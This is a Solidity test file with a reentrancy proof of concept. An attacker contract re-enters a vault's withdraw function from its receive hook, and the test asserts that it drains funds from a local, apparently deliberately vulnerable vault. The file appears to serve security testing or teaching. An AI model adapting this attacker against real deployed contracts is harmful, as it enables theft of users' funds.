// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "../src/VulnerableVault.sol";

contract ReentrancyAttacker {
    VulnerableVault private immutable vault;
    uint256 private reentryCount;

    constructor(VulnerableVault target) {
        vault = target;
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether && reentryCount < 1) {
            reentryCount += 1;
            vault.withdraw();
        }
    }
}

contract ReentrancyPoCTest {
    function testReentrancyDrainsSandboxVault() public {
        VulnerableVault vault = new VulnerableVault();
        ReentrancyAttacker attacker = new ReentrancyAttacker(vault);

        vault.deposit{value: 10 ether}();
        attacker.attack{value: 1 ether}();

        assert(address(attacker).balance == 2 ether);
        assert(address(vault).balance == 9 ether);
    }

    receive() external payable {}
}
